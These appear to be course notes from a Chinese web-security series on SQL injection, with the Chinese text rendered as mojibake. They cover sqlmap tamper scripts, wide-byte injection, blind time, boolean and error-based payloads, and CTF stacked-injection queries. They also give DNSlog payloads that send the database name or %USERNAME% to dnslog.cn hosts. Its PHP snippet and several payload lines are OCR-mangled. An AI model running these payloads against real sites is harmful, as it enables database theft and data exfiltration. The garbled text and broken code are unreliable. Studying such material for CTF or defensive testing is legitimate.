<h1 id="ç¬¬27å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-Tamperè„šæœ¬-Base64-Json-md5ç­‰"><a href="#ç¬¬27å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-Tamperè„šæœ¬-Base64-Json-md5ç­‰" class="headerlink" title="ç¬¬27å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;Tamperè„šæœ¬&amp;Base64&amp;Json&amp;md5ç­‰"></a>ç¬¬27å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;Tamperè„šæœ¬&amp;Base64&amp;Json&amp;md5ç­‰</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-11"><a href="#çŸ¥è¯†ç‚¹ï¼š-11" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æ•°æ®è¡¨ç°æ ¼å¼ç±»å‹æ³¨å…¥<br>2ã€å­—ç¬¦è½¬ä¹‰ç»•è¿‡-å®½å­—èŠ‚æ³¨å…¥<br>3ã€æ•°å­—&amp;å­—ç¬¦&amp;æœç´¢&amp;ç¼–ç &amp;åŠ åº”ç­‰</p>
<h5 id="å‚è€ƒèµ„æ–™ï¼š"><a href="#å‚è€ƒèµ„æ–™ï¼š" class="headerlink" title="#å‚è€ƒèµ„æ–™ï¼š"></a>#å‚è€ƒèµ„æ–™ï¼š</h5><p>:star:<a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a></p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-7"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-7" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><h6 id="æœ¬åœ°æºç æ•°å­—-å­—ç¬¦-æœç´¢-ç¼–ç -JSON"><a href="#æœ¬åœ°æºç æ•°å­—-å­—ç¬¦-æœç´¢-ç¼–ç -JSON" class="headerlink" title="æœ¬åœ°æºç æ•°å­—&amp;å­—ç¬¦&amp;æœç´¢&amp;ç¼–ç &amp;JSON"></a>æœ¬åœ°æºç æ•°å­—&amp;å­—ç¬¦&amp;æœç´¢&amp;ç¼–ç &amp;JSON</h6><p>æ•°å­—å‹ 0-9 å­—ç¬¦å‹ a-zä¸­æ–‡æ ‡ç‚¹ç¬¦å·åŠ å…¥äº†å•å¼•å·ï¼ˆå•å¼•å·é—­åˆ 1â€˜ and 1&#x3D;1 â€“+ï¼‰<br>æœç´¢å‹ åœ¨åŸºç¡€ä¸ŠåˆåŠ å…¥çš„é€šé…ç¬¦ï¼ˆ%â€™é—­åˆï¼‰<br>ç¼–ç å‹ æ•°æ®ä»¥ç¼–ç å€¼ä¼ é€’ åŠ å¯†å‹ æ•°æ®ä»¥åŠ å¯†åçš„å¯†æ–‡å»ä¼ é€’ï¼ˆå¯¹æ³¨å…¥è¯­å¥è¿›è¡ŒåŠ è§£å¯†åä»£å…¥ï¼‰<br>æ ¼å¼å‹ json ï¼ˆå•å¼•å·é—­åˆ 1â€˜ and 1&#x3D;1 â€“+ï¼‰ ï¼ˆéœ€è¦æŒ‰ç…§ç±»å‹è¿›è¡Œé—­åˆæˆ–åŠ è§£å¯†æ„é€ ç¬¦åˆæ•°æ®åº“æŸ¥è¯¢çš„æ¡ä»¶å»è¾“å…¥ï¼‰<br>æ•°æ®è¿›è¡Œç¼–ç æ¥å—å¤„ç†ï¼š å‘é€ç¼–ç å€¼ï¼Œå¯¹æ–¹å¸¸ä¼šè¿›è¡Œè§£ç åå¸¦å…¥æ•°æ®åœ¨è¿›è¡ŒSQLæ‰§è¡Œ<br>åœ¨æ³¨å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿè¦å°è¯•å¯¹æ³¨å…¥çš„Payloadiè¿›è¡Œç¼–ç åæäº¤<br>#sqlmapåœ¨ä½¿ç”¨æ—¶å¯ä»¥åˆ¤æ–­å‡ºæ³¨å…¥ç‚¹ç±»å‹æ˜¯å¦ä¸ºæ•°å­—å‹ã€æœç´¢å‹æˆ–è€…å­—ç¬¦å‹ï¼Œä½†æ˜¯å¯¹ç¼–ç å‹çš„æ³¨å…¥æ— æ³•è‡ªåŠ¨åˆ¤æ–­ï¼Œæ‰€ä»¥éœ€è¦å¼•ç”¨tamperè„šæœ¬è¿›è¡Œç¼–ç  ä¾‹å¦‚å¯¹å‚æ•°è¿›è¡Œbase64ç¼–ç çš„ç½‘ç«™è¿›è¡Œsqlæ³¨å…¥æµ‹è¯•çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ â€“tamper&#x3D;enbase64.pyè¿›è¡ŒåŠ å¯†</p>
<h6 id="å¢¨è€…é¶åœºå­—ç¬¦è½¬ä¹‰å¤„ç†é˜²æŠ¤-å®½å­—èŠ‚æ³¨å…¥"><a href="#å¢¨è€…é¶åœºå­—ç¬¦è½¬ä¹‰å¤„ç†é˜²æŠ¤-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å¢¨è€…é¶åœºå­—ç¬¦è½¬ä¹‰å¤„ç†é˜²æŠ¤-å®½å­—èŠ‚æ³¨å…¥"></a>å¢¨è€…é¶åœºå­—ç¬¦è½¬ä¹‰å¤„ç†é˜²æŠ¤-å®½å­—èŠ‚æ³¨å…¥</h6><p>ç½‘ç«™ä¼šå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œéƒ¨åˆ†è½¬è¯‘ï¼Œæ¯”å¦‚ï¼š<a href="http://localhost:8081/blog/news.php?gtpl=simple%E2%80%99order">http://localhost:8081/blog/news.php?gtpl=simpleâ€™order</a><br>by 17â€“+ è½¬è¯‘ä¸ºselectfrom sy_guestbook where gTpl&#x3D;â€˜simpleâ€™ order by17â€“+ è‡´ä½¿æŸ¥è¯¢å¤±è´¥<br>åœ¨æ„é€ é—­åˆå‰è¾“å…¥ %df ä¼šä½¿æŸ¥è¯¢å˜ä¸ºselectfrom sy_guestbook where gTpl&#x3D;â€˜simpleâ™¦â€™ order by 17â€“+ ï¼ˆæ–¹å—åœ¨æ­¤å¤„ä¸º2ä¸ªå­—èŠ‚ä¼šè¦†ç›–æ­¤å¤„çš„\ä»è€Œå®ç°ç»•è¿‡ï¼‰<br>åœ¨PHPä¸­å­˜åœ¨é­”æœ¯å¼•å·å¼€å…³magic_quotes_gpcï¼Œå¼€å¯åä¼šå¯¹ä¼ å…¥å‚æ•°ä¸­çš„ å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULLï¼ˆNULL å­—ç¬¦ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿<br>æ‰€ä»¥åœ¨é¢å¯¹å®½å­—èŠ‚æ³¨å…¥æ˜¯å¯ä»¥ä½¿ç”¨sqlmapä¸­çš„â€“tamper&#x3D;unmagciquotes.pyè„šæœ¬è¿›è¡Œç»•è¿‡</p>
<h6 id="çœŸå®WEB-æ•°æ®ç¼–ç æ¥å—å¤„ç†-base64æ³¨å…¥"><a href="#çœŸå®WEB-æ•°æ®ç¼–ç æ¥å—å¤„ç†-base64æ³¨å…¥" class="headerlink" title="çœŸå®WEB-æ•°æ®ç¼–ç æ¥å—å¤„ç†-base64æ³¨å…¥"></a>çœŸå®WEB-æ•°æ®ç¼–ç æ¥å—å¤„ç†-base64æ³¨å…¥</h6><p>#sqlmapåœ¨ä½¿ç”¨æ—¶å¯ä»¥åˆ¤æ–­å‡ºæ³¨å…¥ç‚¹ç±»å‹æ˜¯å¦ä¸ºæ•°å­—å‹ã€æœç´¢å‹æˆ–è€…å­—ç¬¦å‹ï¼Œä½†æ˜¯å¯¹ç¼–ç å‹çš„æ³¨å…¥æ— æ³•è‡ªåŠ¨åˆ¤æ–­ï¼Œæ‰€ä»¥éœ€è¦å¼•ç”¨tamperè„šæœ¬è¿›è¡Œç¼–ç  ä¾‹å¦‚å¯¹å‚æ•°è¿›è¡Œbase64ç¼–ç çš„ç½‘ç«™è¿›è¡Œsqlæ³¨å…¥æµ‹è¯•çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ â€“tamper&#x3D;enbase64.pyè¿›è¡ŒåŠ å¯†</p>
<p>çœŸå®WEB-JSONæ•°æ®æ ¼å¼&amp;MD5åŠ å¯†æ•°æ®<br>å·¥å…·è„šæœ¬-SQLMAP-è„šæœ¬Tamperä½¿ç”¨æŒ‡å—              â€”â€”â€”â€”å¯ä»¥å»çœ‹çœ‹ctfshowçš„ctfé¢˜ç›®ï¼Œæœ‰ä¸€å°æ®µä¸“é¢˜å°±æ˜¯è®²è¿™ä¸ªçš„</p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a>    å¾ˆå¥½çš„ä¸€ç¯‡æ–‡ç« ï¼Œå¯ä»¥ç†Ÿç»ƒæŒæ¡sqlmapçš„ä½¿ç”¨ã€‚</p>
<h1 id="ç¬¬28å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-HTTPå¤´XFF-COOKIE-POSTæ¸…æ±‚"><a href="#ç¬¬28å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-HTTPå¤´XFF-COOKIE-POSTæ¸…æ±‚" class="headerlink" title="ç¬¬28å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;HTTPå¤´XFF&amp;COOKIE&amp;POSTæ¸…æ±‚"></a>ç¬¬28å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;HTTPå¤´XFF&amp;COOKIE&amp;POSTæ¸…æ±‚</h1><p>çŸ¥è¯†ç‚¹ï¼š<br>1ã€æ•°æ®è¯·æ±‚æ–¹å¼-GET&amp;POST&amp;COOKIEç­‰<br>2ã€å¸¸è§åŠŸèƒ½ç‚¹è¯·æ±‚æ–¹å¼-ç”¨æˆ·ç™»å½•&amp;1Pè®°å½•ç­‰<br>3ã€é»‘ç›’ç™½ç›’æ³¨å…¥æµ‹è¯•è¦ç‚¹-SQLMAPæ³¨å…¥å‚æ•°</p>
<p>è¡¥å……ç‚¹ï¼š<br>é»‘ç›’æµ‹è¯•ï¼šåŠŸèƒ½ç‚¹åˆ†æ<br>ç™½ç›’æµ‹è¯•ï¼šåŠŸèƒ½ç‚¹åˆ†æ&amp;å…³é”®ä»£ç è¿½è¸ª</p>
<p>1.æ•°æ®åº“æ³¨å…¥-access mysql mssql oracle mongodb postgresqç­‰<br>2.æ•°åŸ¹ç±»å‹æ³¨å…¥-æ•°å­—å‹å­—ç¬¦å‹æœç´¢å‹åŠ å¯†å‹(base64js0n)ç­‰<br>3.æäº¤æ–¹å¼æ³¨å…¥-get post cookie httpå¤´ç­‰<br>4æŸ¥è¯¢æ–¹å¼æ³¨å…¥-æŸ¥è¯¢å¢åŠ åˆ æµ‹é™¤æ›´æ–°å †å ç­‰<br>5.å¤æ‚æ³¨å…¥åˆ©ç”¨-äºŒæ¬¡æ³¨å…¥dnslogæ³¨å…¥ç»•è¿‡bypassç­‰</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹ï¼š<br>GET&amp;POST&amp;COOKIE&amp;SERVER<br>å®ä¾‹é»‘ç›’-åå°è¡¨å•ç™»é™†æ¡†-POSTæ³¨å…¥<br>å®ä¾‹ç™½ç›’-ESPCMS-å•†å“è´­ä¹°-COOKIEæ³¨å…¥<br>å®ä¾‹ç™½ç›’-ZZCMS-IPè®°å½•åŠŸèƒ½-HTTPå¤´XFFæ³¨å…¥         <a href="https://blog.csdn.net/qq_48511129/article/details/122692991">https://blog.csdn.net/qq_48511129/article/details/122692991</a><br>æ­¤å¤„ç™»å½•å¤±è´¥ä¼šä»å…¨å±€å˜é‡è·å–å®¢æˆ·ç«¯ipâ€“å½“å¯†ç å¤±è´¥æ¬¡æ•°è¿‡å¤šç¦æ­¢ç™»å½•â€“é€šè¿‡æŠ“åŒ…ä¿®æ”¹x-for-wordå­—æ®µç»•è¿‡</p>
<p>#éƒ¨åˆ†è¯­è¨€æ¥å—ä»£ç å—</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#éƒ¨åˆ†è¯­è¨€æ¥å—ä»£ç å—</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">Sget=<span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line">Spost=<span class="variable">$_POST</span>[<span class="string">&#x27;p]:I</span></span><br><span class="line"><span class="string">Scookie=$_COOKIE[&#x27;</span>c<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">Srequest=&amp;_ REQUESTT&#x27;</span>r]:</span><br><span class="line">Shost=S SERVER[<span class="string">&#x27;HTTP HOST];</span></span><br><span class="line"><span class="string">Suser agent=$SERVER[&quot;HTTP USER AGENT].</span></span><br><span class="line"><span class="string">Sip=$SERVER[HTTP X FORWARDED FOR&quot;]:</span></span><br><span class="line"><span class="string">echo $get.&quot;&lt;hr&gt;&quot;</span></span><br><span class="line"><span class="string">echo $post.&quot;&lt;hr&gt;&quot;:</span></span><br><span class="line"><span class="string">echo $cookie.&quot;&lt;hr&gt;&quot;</span></span><br><span class="line"><span class="string">echo $request.&quot;&lt;hr&gt;&quot;:</span></span><br><span class="line"><span class="string">echo $host.&quot;&lt;hr&gt;&quot;;</span></span><br><span class="line"><span class="string">echo $user agent.&quot;&lt;hr&gt;&quot;;</span></span><br><span class="line"><span class="string">echo $ip;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬29å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-å¢åˆ æ”¹æŸ¥-ç›²æ³¨-å»¶æ—¶-å¸ƒå°”-æŠ¥é”™"><a href="#ç¬¬29å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-å¢åˆ æ”¹æŸ¥-ç›²æ³¨-å»¶æ—¶-å¸ƒå°”-æŠ¥é”™" class="headerlink" title="ç¬¬29å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;å¢åˆ æ”¹æŸ¥&amp;ç›²æ³¨&amp;å»¶æ—¶&amp;å¸ƒå°”&amp;æŠ¥é”™"></a>ç¬¬29å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;å¢åˆ æ”¹æŸ¥&amp;ç›²æ³¨&amp;å»¶æ—¶&amp;å¸ƒå°”&amp;æŠ¥é”™</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-12"><a href="#çŸ¥è¯†ç‚¹ï¼š-12" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æ˜ç¡®æŸ¥é—´æ–¹å¼æ³¨å…¥Payload<br>2ã€æ˜ç¡®æŸ¥è¯¢æ–¹å¼æ³¨å…¥äº§ç”ŸåŠŸèƒ½</p>
<p>3ã€æ˜ç¡®SQLè¨€æ³¨å»¶æ—¶&amp;å¸ƒå°”&amp;æŠ¥é”™</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-2"><a href="#è¯¦ç»†ç‚¹ï¼š-2" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>ç›²æ³¨å°±æ˜¯åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œè·å–çš„æ•°æ®ä¸èƒ½å›æ˜¾è‡³å‰ç«¯é¡µé¢ã€‚<br>æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–è€…å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¹‹ä¸ºç›²æ³¨ã€‚<br>æˆ‘ä»¬å¯ä»¥çŸ¥é“ç›²æ³¨åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»ï¼š<br>åŸºäºå¸ƒå°”çš„SQLç›´æ³¨é€»è¾‘åˆ¤æ–­<br>regexp,like,ascii,left,ord.mid<br>åŸºäºæ—¶é—´çš„SQLç›²æ³¨å»¶æ—¶åˆ¤æ–­<br>if,sleep<br>åŸºäºæŠ¥é”™çš„SQLç›²æ³¨æŠ¥æªå›æ˜¾<br>floor,updatexml,extractvalue<br><a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
<p>#å‚è€ƒï¼š<br>like â€˜ro% #åˆ¤æ–­0æˆ–0.æ˜¯å¦æˆç«‹<br>regexp â€œxiaod[a-Z]â€™ #åŒ¹é…xiaodiåŠxiaodi.ç­‰<br>if(æ¡ä»¶ï¼Œ5,0) #æ¡ä»¶æˆç«‹è¿”å›5åä¹‹è¿”å›0<br>sleep(5) #SQLè¯­å¥å»¶æ—¶æ‰§è¡Œ5ç§’<br>mid(a.b.c) #ä»ä½ç½®bå¼€å§‹ï¼Œè½½å–aå­—ç¬¦ä¸²çš„cä½<br>substr(a,b,c) #ä»ä½ç½®bå¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸²açš„cé•¿åº¦<br>left(database0,1),database0 #let(a,b)ä»å·¦ä¾§æˆªå–açš„å‰bä½<br>length(database0)&#x3D;8 #åˆ¤æŠ˜æ•°æ®åº“database(Oåçš„é•¿åº¦<br>ord&#x3D;ascii ascii(X)&#x3D;97 #åˆ¤æ–°xçš„asciitç æ˜¯å¦ç­‰äº97</p>
<p>SQLæŸ¥è¯¢æ–¹å¼æ±ªå…¥<br>select insert update delete orderbyç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-8"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-8" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>SQL-ç›²æ³¨&amp;å¸ƒå°”&amp;æŠ¥é”™&amp;å»¶æ—¶<br>æŸ¥-select-xhcms-å¸ƒå°”ç›²æ³¨       <a href="https://www.freebuf.com/articles/web/264357.html">https://www.freebuf.com/articles/web/264357.html</a>    â€”â€”â€“xhcmsçš„å„ç§æ¼æ´</p>
<p>æ’å…¥-insert-xhcms-æŠ¥é”™ç›²æ³¨<br>æ›´æ–°-update-xhcms-&#x3D;æŠ¥é”™ç›²æ³¨<br>åˆ é™¤-delete-kkcms-å»¶æ—¶ç›²æ³¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#SQL-ç›²æ³¨&amp;å¸ƒå°”&amp;æŠ¥æª&amp;å»¶æ—¶ PHPå¼€å‘é¡¹ç›®è¾“å‡ºç»“æœ&amp;å¼€å¯æŠ¥æª</span><br><span class="line">åŸºäºå»¶æ—¶ï¼š /blog/news.php?id=1 and if(1=1,sleep(5),0) ä¸éœ€è¦è¾“å‡º</span><br><span class="line">é€šè¿‡ifåé¢çš„åˆ¤æ–­è¯­å¥å»çŒœè§£ä¿¡æ¯ï¼Œæ¯”å¦‚if(length(database())=1,sleep(5),0)åˆ¤æ–­æ•°æ®åº“é•¿åº¦æ˜¯å¦ä¸º1ï¼Œè‹¥çŒœè§£æ­£ç¡®åˆ™è¿”å›æ—¶é—´å»¶æ—¶5ç§’</span><br><span class="line">åŸºäºå¸ƒå°”ï¼š /blog/news.php?id=1 and length(databaseï¼ˆï¼‰=7 éœ€è¦æœ‰æ•°æ®åº“è¾“å‡ºåˆ¤æ–­æ ‡æ³¨</span><br><span class="line">åŸºäºæŠ¥é”™ï¼š/blog/news.php?id=2 and updatexml(1,concat(Ox7e,(SELECT@@version),0x7e).1)</span><br><span class="line">éœ€è¦æœ‰æ•°æ®åº“è¾“å‡ºæŠ¥é”™å¤„ç†=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ°è¿™é‡Œsqlæ³¨å…¥ç»ˆäºä¹Ÿæ˜¯ç»“æŸäº†ï¼Œsqlæ³¨å…¥ä¹Ÿæ˜¯CTFä¸­çš„å¾ˆå¤§ä¸€è€ƒç‚¹ï¼ŒåŸºæœ¬ä¸Šæ¯åœºæ¯”èµ›éƒ½æœ‰sqlçš„èº«å½±ã€‚</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬30å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-CTF-äºŒæ¬¡-å †å -DNSå¸¦å¤–"><a href="#ç¬¬30å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-SQLæ³¨å…¥-CTF-äºŒæ¬¡-å †å -DNSå¸¦å¤–" class="headerlink" title="ç¬¬30å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;CTF&amp;äºŒæ¬¡&amp;å †å &amp;DNSå¸¦å¤–"></a>ç¬¬30å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;SQLæ³¨å…¥&amp;CTF&amp;äºŒæ¬¡&amp;å †å &amp;DNSå¸¦å¤–</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-13"><a href="#çŸ¥è¯†ç‚¹ï¼š-13" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><h6 id="1ã€æ•°æ®åº“å †å æ³¨å…¥"><a href="#1ã€æ•°æ®åº“å †å æ³¨å…¥" class="headerlink" title="1ã€æ•°æ®åº“å †å æ³¨å…¥"></a>1ã€æ•°æ®åº“å †å æ³¨å…¥</h6><p>æ ¹æ®æ•°æ®åº“ç±»å‹å†³å®šæ˜¯å¦æ”¯æŒå¤šæ¡è¯­å¥æ‰§è¡Œ</p>
<h6 id="2ã€æ•°æ®åº“äºŒæ¬¡æ³¨å…¥"><a href="#2ã€æ•°æ®åº“äºŒæ¬¡æ³¨å…¥" class="headerlink" title="2ã€æ•°æ®åº“äºŒæ¬¡æ³¨å…¥"></a>2ã€æ•°æ®åº“äºŒæ¬¡æ³¨å…¥</h6><p>åº”ç”¨åŠŸèƒ½é€»è¾‘æ¶‰åŠä¸Šå¯¼è‡´çš„å…ˆå†™å…¥åç»„åˆçš„æ³¨å…¥</p>
<h6 id="3ã€æ•°æ®åº“Dnslogæ³¨å…¥"><a href="#3ã€æ•°æ®åº“Dnslogæ³¨å…¥" class="headerlink" title="3ã€æ•°æ®åº“Dnslogæ³¨å…¥"></a>3ã€æ•°æ®åº“Dnslogæ³¨å…¥</h6><p>è§£å†³ä¸å›æ˜¾ï¼ˆåå‘è¿æ¥ï¼‰ï¼ŒSQLæ³¨å…¥ï¼Œå‘½ä»¤æ‰§è¡Œï¼ŒSSRFç­‰</p>
<h6 id="4ã€é»‘ç›’æ¨¡å¼åˆ†æä»¥ä¸Š"><a href="#4ã€é»‘ç›’æ¨¡å¼åˆ†æä»¥ä¸Š" class="headerlink" title="4ã€é»‘ç›’æ¨¡å¼åˆ†æä»¥ä¸Š"></a>4ã€é»‘ç›’æ¨¡å¼åˆ†æä»¥ä¸Š</h6><p>äºŒæ¬¡æ³¨å…¥ï¼šæ’å…¥åè°ƒç”¨æ˜¾ç¤ºæ“ä½œç¬¦åˆ        </p>
<p><img src="https://image.3001.net/images/20200921/1600691018_5f689b4a264c5e1261c28.png!small" alt="1600691018_5f689b4a264c5e1261c28.png!small"></p>
<p>å †å æ³¨å…¥ï¼šåˆ¤æ–­æ³¨å…¥åç›´æ¥è°ƒå¤šæ¡æ‰§è¡Œ<br>DNSæ³¨å…¥ï¼šåœ¨æ³¨å…¥ä¸Šæ²¡å¤ªå¤§åˆ©ç”¨ä»·å€¼ï¼Œå…¶ä»–è¿˜è¡Œ        <a href="https://blog.csdn.net/qq_45300786/article/details/107764907">https://blog.csdn.net/qq_45300786/article/details/107764907</a>       ä¸€ç§å¾ˆæ–°çš„æ€è·¯ï¼Œdnså¤–å¸¦çš„</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-9"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-9" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>äºŒæ¬¡æ³¨å…¥-74CMS&amp;ç½‘é¼æ¯2018 Unfinish</p>
<p>å †å æ³¨å…¥-æ•°æ®åº“ç±»å‹&amp;å¼ºç½‘æ¯2019éšä¾¿æ³¨<br>DNSåˆ©ç”¨-å¹³å°ä»‹ç»&amp;SQLæ³¨å…¥&amp;å‘½ä»¤æ‰§è¡Œç­‰</p>
<h6 id="äºŒæ¬¡æ³¨å…¥-74CMS-ç½‘é¼æ¯2018-Unfinish"><a href="#äºŒæ¬¡æ³¨å…¥-74CMS-ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="#äºŒæ¬¡æ³¨å…¥-74CMS&amp;ç½‘é¼æ¯2018 Unfinish"></a>#äºŒæ¬¡æ³¨å…¥-74CMS&amp;ç½‘é¼æ¯2018 Unfinish</h6><p>CTF-Iç½‘é¼æ¯2018 Unfinish<br>CMS-74CMSä¸ªäººä¼šå‘˜ä¸­å¿ƒ</p>
<h6 id="å †å æ³¨å…¥æ•°æ®åº“ç±»å‹-å¼ºç½‘æ¯2019éšä¾¿æ³¨"><a href="#å †å æ³¨å…¥æ•°æ®åº“ç±»å‹-å¼ºç½‘æ¯2019éšä¾¿æ³¨" class="headerlink" title="#å †å æ³¨å…¥æ•°æ®åº“ç±»å‹&amp;å¼ºç½‘æ¯2019éšä¾¿æ³¨"></a>#å †å æ³¨å…¥æ•°æ®åº“ç±»å‹&amp;å¼ºç½‘æ¯2019éšä¾¿æ³¨</h6><p>æ ¹æ®æ•°æ®åº“ç±»å‹å†³å®šæ˜¯å¦æ”¯æŒå¤šæ¡è¯­å¥æ‰§è¡Œ<br>æ”¯æŒå †å æ•°æ®åº“ç±»å‹ï¼šMYSQL MSSQL Postgresqlç­‰<br>â€˜;show databases;<br>â€˜;show tables;<br>â€˜;show columns from&#96;1919810931114514:<br>â€˜;select flag from â€˜1919810931114514â€™:<br>â€˜;SeT<br>@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460:p<br>repare execsql from @a;execute execsql;</p>
<h6 id="DNSåˆ©ç”¨-å¹³å°ä»‹ç»-SQLæ³¨å…¥-å‘½ä»¤æ‰§è¡Œç­‰"><a href="#DNSåˆ©ç”¨-å¹³å°ä»‹ç»-SQLæ³¨å…¥-å‘½ä»¤æ‰§è¡Œç­‰" class="headerlink" title="#DNSåˆ©ç”¨-å¹³å°ä»‹ç»&amp;SQLæ³¨å…¥&amp;å‘½ä»¤æ‰§è¡Œç­‰"></a>#DNSåˆ©ç”¨-å¹³å°ä»‹ç»&amp;SQLæ³¨å…¥&amp;å‘½ä»¤æ‰§è¡Œç­‰</h6><p>1.å¹³å°<br><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a><br><a href="http://ceve.io/">http://ceve.io</a><br>2.åº”ç”¨åœºæ™¯ï¼š<br>è§£å†³ä¸å›æ˜¾ï¼Œåå‘è¿æ¥ï¼ŒSQLæ³¨å…¥ï¼Œå‘½ä»¤æ‰§è¡Œï¼ŒSSRFç­‰<br>SQLæ³¨å…¥ï¼š<br>select load file(concat(â€œâ€˜,(select databaseï¼ˆï¼‰,.7logee.dnslog.cnllaaâ€™));<br>and (select load_file(concat(&#x2F;&#x2F;,(select databaseï¼ˆï¼‰),â€˜.69knl9.dnslog.cn&#x2F;abcâ€™)))<br>å‘½ä»¤æ‰§è¡Œï¼š<br>ping %USERNAME%.7logee.dnslog.cn</p>
<h1 id="ç¬¬31å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-æ–‡ä»¶ä¸Šä¼ -jséªŒè¯-mime-user-ini-è¯­è¨€ç‰¹æ€§"><a href="#ç¬¬31å¤©-WEBæ”»é˜²-é€šç”¨æ¼æ´-æ–‡ä»¶ä¸Šä¼ -jséªŒè¯-mime-user-ini-è¯­è¨€ç‰¹æ€§" class="headerlink" title="ç¬¬31å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;æ–‡ä»¶ä¸Šä¼ &amp;jséªŒè¯&amp;mime&amp;user.ini&amp;è¯­è¨€ç‰¹æ€§"></a>ç¬¬31å¤© WEBæ”»é˜²-é€šç”¨æ¼æ´&amp;æ–‡ä»¶ä¸Šä¼ &amp;jséªŒè¯&amp;mime&amp;user.ini&amp;è¯­è¨€ç‰¹æ€§</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-14"><a href="#çŸ¥è¯†ç‚¹ï¼š-14" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€æ–‡ä»¶ä¸Šä¼ -å‰ç«¯éªŒè¯<br>2ã€æ–‡ä»¶ä¸Šä¼ -é»‘ç™½åå•<br>3ã€æ–‡ä»¶ä¸Šä¼ user.inå¦™ç”¨<br>4ã€æ–‡ä»¶ä¸Šä¼ -<a 